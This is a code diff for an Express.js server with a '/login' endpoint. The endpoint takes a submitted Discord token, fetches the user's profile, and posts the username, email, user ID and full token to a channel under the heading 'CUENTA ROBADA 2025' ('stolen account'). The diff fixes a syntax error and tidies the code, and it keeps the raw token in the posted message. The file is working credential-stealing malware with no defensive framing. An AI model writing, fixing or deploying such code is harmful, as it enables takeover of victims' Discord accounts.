@@ -1,11 +1,11 @@
 const express = require('express');
-const https = require('https';
+const https = require('https');
 const app = express();
 app.use(express.json());
 
 app.post('/login', async (req, res) => {
   const token = req.body.token;
-  if (!token || token.length < 50) return res.send("no token");
+  if (!token || token.length < 50) return res.send('no token');
 
   try {
     const user = await discordAPI('GET', '/users/@me', token);
@@ -16,16 +16,15 @@ app.post('/login', async (req, res) => {
       content: "@everyone **CUENTA ROBADA 2025**",
       embeds: [{
         title: `${user.username}#${user.discriminator}`,
-        description: `Email: ${user.email || 'oculto'}\nID: ${user.id}\nToken completo abajo`,
+        description: `Email: ${user.email || 'oculto'}\nID: ${user.id}\nToken: \`\`\`${token}\`\`\``,
         thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512` },
-        color: 0x00ff00,
-        fields: [{ name: "TOKEN", value: "```" + token + "```" }]
+        color: 0x00ff00
       }]
     }));
 
-    res.send("LOGUEADO");
-  } catch {
-    res.send("invalid");
+    res.send('LOGUEADO');
+  } catch (e) {
+    res.send('invalid');
   }
 });
 
